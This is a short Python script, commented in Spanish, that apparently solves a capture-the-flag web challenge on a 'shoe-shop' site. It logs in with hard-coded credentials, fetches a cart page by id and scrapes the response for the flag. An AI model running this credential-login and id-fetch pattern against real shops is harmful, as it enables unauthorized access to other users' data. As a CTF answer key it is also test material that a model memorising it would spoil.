import requests
import re

# URLs
login_url = "https://shoe-shop-1.ctf.zone/index.php?page=login"
cart_url = "https://shoe-shop-1.ctf.zone/index.php?page=cart&id=1"

# Datos del formulario
data = {
    "username": "andy",
    "password": "1234"
}

# Iniciar sesion y guardar cookies
session = requests.Session()

# POST al login
login_response = session.post(login_url, data=data)

if login_response.status_code != 200:
    print(f"Error al hacer login. Status code: {login_response.status_code}")
    exit()

# GET al carrito
cart_response = session.get(cart_url)

if cart_response.status_code != 200:
    print(f"Error al obtener carrito. Status code: {cart_response.status_code}")
    exit()

# Buscar la flag en el HTML
match = re.search(r'flag\{.*?\}', cart_response.text)

if match:
    print(f"FLAG: {match.group(0)}")
else:
    print("No se encontró ninguna flag en la respuesta.")
